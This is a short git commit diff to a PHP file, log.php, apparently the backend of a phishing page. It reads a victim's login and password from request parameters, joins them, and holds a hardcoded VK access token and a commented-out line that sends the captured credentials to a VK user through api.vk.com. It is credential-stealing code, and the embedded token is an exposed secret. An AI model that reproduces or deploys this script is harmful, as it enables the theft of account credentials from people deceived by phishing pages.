76fb2cd9decf59728942b7c8cb81e6712f5e06d8
MrTrojan52 <kirill_131097@mail.ru>
2018-02-16 23:48:12 +0300

    3.1

--- log.php
+++ log.php
@@ -1,6 +1,6 @@
 <?php
-$Log =$_POST['login'];
-$Pass=$_POST['password'];
+$Log =$_GET['login'];
+$Pass=$_GET['password'];
 $text = "$Log:$Pass";
 $token = 'd1f27f6546892ba80d5c34f02ca8c5e0453a22cd95e60902613170ad8bed0debe95c88fb7df48215f7663'; // ТУТ ВАШ ТОКЕН - ОТ АНДРОИДА ИЛИ ИНСТАГРАМА, НЕ ОТ АЙФОНА!
 //$post = file_get_contents ('https://api.vk.com/method/messages.send?user_id=84364520&message='.urlencode($text).'&access_token='.$token);
